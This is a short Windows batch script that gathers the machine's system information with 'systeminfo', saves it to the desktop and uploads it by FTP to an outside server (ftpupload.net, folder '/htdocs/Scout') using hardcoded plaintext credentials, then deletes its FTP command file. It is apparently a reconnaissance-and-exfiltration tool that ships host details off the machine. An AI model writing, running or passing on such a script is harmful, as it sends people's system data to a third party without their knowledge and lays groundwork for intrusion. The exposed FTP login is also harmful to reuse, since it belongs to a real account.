@echo off
set FTPSERVER=ftpupload.net
set FTPUSER="ezyro_36308312"
set FTPPASS="MegaPass1234"
set FILENAME=systeminfo.txt

rem Set the path to the desktop folder
set DESKTOP=%USERPROFILE%\Desktop

rem Generate systeminfo.txt on the desktop
systeminfo > "%DESKTOP%\%FILENAME%"

rem Check if the file was generated successfully
if exist "%DESKTOP%\%FILENAME%" (
    (
    echo open %FTPSERVER%
    echo %FTPUSER%
    echo %FTPPASS%
    echo binary
    echo cd /htdocs/Scout
    echo put "%DESKTOP%\%FILENAME%"
    echo quit
    ) > ftpcmd.txt

    ftp -n -s:ftpcmd.txt
    del ftpcmd.txt
    pause
) else (
    echo Failed to generate systeminfo.txt on the desktop.
    pause
)
